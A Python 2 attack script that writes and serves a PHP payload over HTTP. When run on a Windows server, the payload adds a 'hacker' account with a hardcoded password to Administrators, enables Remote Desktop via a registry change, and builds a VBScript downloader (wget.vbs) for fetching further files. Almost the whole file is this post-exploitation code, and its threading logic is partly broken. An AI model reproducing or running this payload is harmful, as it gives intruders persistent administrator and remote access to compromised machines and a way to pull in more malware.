import random
import string
import os
import SimpleHTTPServer
import SocketServer
import urllib2
import time
import threading

def randomString():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(12))
payloadname = str(randomString()) + ".php"

def writePHP(content):
	#content =createPHP()
	with open(payloadname, "a") as phpfile:
		phpfile.write(content)

def createPHP():
	phpcontent = """
<?php
$answerUser = system("---CREATING USER & net user hacker Welkom01 /add");
$answerAdmin = system("echo ---ADDING ADMIN & net localgroup Administrators hacker /add");
$answerRDP = system("echo ---ENABLING RDP & reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal\ Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
$answerWGET= system("echo ---CREATING WGET.VBS & echo strUrl = WScript.Arguments.Item(0) > wget.vbs");
$answerWGET= system("echo StrFile = WScript.Arguments.Item(1) >> wget.vbs");
$answerWGET= system("echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = '0' >> wget.vbs");
$answerWGET= system("echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs");
$answerWGET= system("echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs");
$answerWGET= system("echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs");
$answerWGET= system("echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs");
$answerWGET= system("echo Err.Clear >> wget.vbs");
$answerWGET= system("echo Set http = Nothing >> wget.vbs");
$answerWGET= system("echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs");
$answerWGET= system("echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs");
$answerWGET= system("echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs");
$answerWGET= system("echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs");
$answerWGET= system("echo http.Open \"GET\",strURL,False >> wget.vbs");
$answerWGET= system("echo http.Send >> wget.vbs");
$answerWGET= system("echo varByteArray = http.ResponseBody >> wget.vbs");
$answerWGET= system("echo Set http = Nothing >> wget.vbs");
$answerWGET= system("echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs");
$answerWGET= system("echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs");
$answerWGET= system("echo strData = \"\" >> wget.vbs");
$answerWGET= system("echo strBuffer = \"\" >> wget.vbs");
$answerWGET= system("echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs");
$answerWGET= system("echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs");
$answerWGET= system("echo Next >> wget.vbs");
$answerWGET= system("echo ts.Close >> wget.vbs");
?>
"""
	return phpcontent

def servePayload(self):
	while True:
		try:
			os.system('python -m SimpleHTTPServer 80')
		except KeyboardInterrupt:
			print "[i] Stopped serving"
			time.sleep(self.interval)
			os.system('pkill -f "SimpleHTTPServer"')

def deletePHP():
	if os.path.exists(payloadname):
		os.remove(payloadname)
		print "[i] Removed: " + payloadname
	else:
		print "[ X ] The file "+payloadname+" does not exist"

class ThreadingExample(object):
	def __init__(self, interval=1):
		self.interval = interval
		HTTPd_thread = threading.Thread(target=servePayload(self))
		HTTPd_thread.daemon = True
		HTTPd_thread.start()

	def run(self):
		while True:
			print (urllib2.urlopen("http://localhost/"+payloadname).read())
			print "servepayload running"
			time.sleep(self.interval)


writePHP(createPHP())
ThreadingExample()
deletePHP()


#cat o.tmp | tail -100 | grep -A1 '\-\-\-'